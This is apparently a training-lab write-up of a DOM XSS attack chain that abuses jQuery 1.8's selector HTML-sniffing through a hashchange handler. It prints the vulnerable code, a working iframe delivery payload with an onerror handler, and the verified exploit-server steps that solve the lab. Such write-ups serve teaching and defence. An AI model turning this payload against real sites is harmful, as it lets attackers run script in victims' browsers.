# Attack Chain — DOM XSS via jQuery selector sink (hashchange-gated, victim-delivered)

## The vulnerable code (home page, served verbatim)
```js
$(window).on('hashchange', function(){
    var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
    if (post) post.get(0).scrollIntoView();
});
```

## Data flow (victim leg included)
```
Attacker stores on exploit server (/exploit):
    <iframe src="https://LAB/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
   │
   ▼
Victim visits https://exploit-server.net/exploit            [DELIVERY LEG]
   │  iframe loads LAB with empty fragment
   ▼
iframe onload → this.src += '<img src=x onerror=print()>'
   │  same-document fragment navigation inside the iframe
   ▼
[EVENT GATE] hashchange fires in the LAB-origin iframe
   │
   ▼
[SOURCE] window.location.hash  →  #<img src=x onerror=print()>
   │  .slice(1) → decodeURIComponent → <img src=x onerror=print()>
   ▼
[SINK] $('section.blog-list h2:contains(' + PAYLOAD + ')')
   │  jQuery 1.8 HTML-sniff matches embedded <…> → buildFragment creates <img>
   ▼
[TRUST BOUNDARY CROSSED] detached <img src=x> fails to load → onerror fires
in the LAB origin with the VICTIM's cookies/context → print()
   ▼
RESULT: print() in victim browser → lab detects → is-solved
```

## Why each link is necessary
1. **Why the fragment, not the query**: the feature reads `location.hash`; fragments are
   never sent to the server, so no server log/filter can intervene — and none exists.
2. **Why the change event matters**: `hashchange` fires only when the fragment of a live
   document CHANGES. Cold navigation to `/#payload` never runs the handler (proven).
   The iframe first loads `#` (or empty) and only then mutates it — manufacturing the
   change inside the victim's browser.
3. **Why jQuery executes it**: the concatenated selector contains `<img …>` before the
   final `)`. jQuery 1.8's HTML-sniff regex matches `<…>`-containing strings and routes
   them to fragment construction instead of Sizzle selection. The created `<img>` is
   detached, but resource-error events fire on detached elements — `onerror` runs.
   (Direct eval returned `OK len=1`, zero exceptions.)
4. **Why `print()`**: it is the lab's victim-side detection signal (dialog-class API the
   lab harness observes). Any JS would run; `print()` is what the platform counts.

## Expected response sequence (verified)
1. `POST /` (exploit server, STORE) → 200; `GET /exploit` serves the iframe verbatim.
2. `POST /` (DELIVER_TO_VICTIM) → 302 → delivery queued.
3. Access log shows `GET /exploit/ … user-agent: Mozilla/5.0 (Victim)…Chrome/151…`.
4. Lab banner flips `is-notsolved` → `is-solved`.